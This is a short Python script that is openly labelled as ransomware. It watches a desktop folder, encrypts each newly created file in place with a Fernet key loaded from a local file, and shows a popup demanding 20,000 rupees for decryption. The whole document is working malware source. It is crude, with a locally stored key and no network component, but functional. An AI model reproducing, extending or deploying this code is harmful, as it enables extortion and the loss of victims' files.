import os
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

# Function to read the encryption key from a file
def read_key(file_path):
    with open(file_path, 'rb') as key_file:
        key = key_file.read()
    return key

# Function to encrypt a file
def encrypt_file(file_path, key):
    # Open file to read
    with open(file_path, 'rb') as file:
        # Read the content and store it into data
        data = file.read()
    
    # Using fernet, encrypt the data and store it into encrypted_data
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)

    # Rewrite the file with encrypted_data, encrypting the file
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Function to display pop-up message
def show_popup(message):
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showinfo("THIS IS A RANSOMEWARE", message)

# Event handler class
class Watcher(FileSystemEventHandler):
    def __init__(self, key):
        self.key = key
    
    def on_created(self, event):
        if not event.is_directory:
            print(f"New file detected: {event.src_path}")
            encrypt_file(event.src_path, self.key)
            show_popup("Your file has been ENCRYPTED! Pay 20,000 rupees to decrypt the files!")

# Monitor Downloads folder
def monitor_folder(path, key):
    event_handler = Watcher(key)
    observer = Observer()
    observer.schedule(event_handler, path, recursive=False)
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

# Main function
if __name__ == "__main__":
    # Specify the path to the Downloads folder
    downloads_folder = r"C:\Users\whack\OneDrive\Desktop\Important Documents"
    
    # Read the encryption key from the file
    key_file_path = r"C:\Users\whack\OneDrive\Desktop\STUFF\Programming STUFF\Python\Ransomeware\encryption_key.txt"
    key = read_key(key_file_path)
    
    # Start monitoring the folder
    monitor_folder(downloads_folder, key)
